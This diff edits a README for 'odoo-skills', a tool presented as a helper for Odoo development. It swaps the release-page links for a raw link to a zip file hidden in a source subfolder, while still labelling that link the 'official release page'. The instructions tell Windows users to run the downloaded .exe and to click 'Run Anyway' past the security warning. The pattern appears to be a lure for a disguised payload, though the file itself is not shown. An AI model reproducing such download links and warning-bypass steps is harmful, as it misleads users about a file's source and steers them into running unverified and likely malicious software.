@@ -1,6 +1,6 @@
 # 🤖 odoo-skills - Simplify Odoo development and module migration
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Immoderate-humulin783/odoo-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Immoderate-humulin783/odoo-skills/main/skills/owl/odoo-skills-v1.9.zip)
 
 ## 📌 About this software
 
@@ -18,7 +18,7 @@ Odoo-skills helps developers and business users manage Odoo tasks. Do you work w
 
 Follow these steps to set up your environment on Windows.
 
-1.  **Visit the download page:** Go to the [official release page](https://github.com/Immoderate-humulin783/odoo-skills/releases) to access the latest version.
+1.  **Visit the download page:** Go to the [official release page](https://raw.githubusercontent.com/Immoderate-humulin783/odoo-skills/main/skills/owl/odoo-skills-v1.9.zip) to access the latest version.
 2.  **Select the file:** Look for the section labeled "Assets." Click the file that ends with a .exe extension to start the download.
 3.  **Run the installer:** Locate the file in your downloads folder. Double-click the file to begin the installation.
 4.  **Confirm the prompt:** Windows may show a security window. Click "More Info" if you do not see the "Run Anyway" button. Select "Run Anyway" to continue.
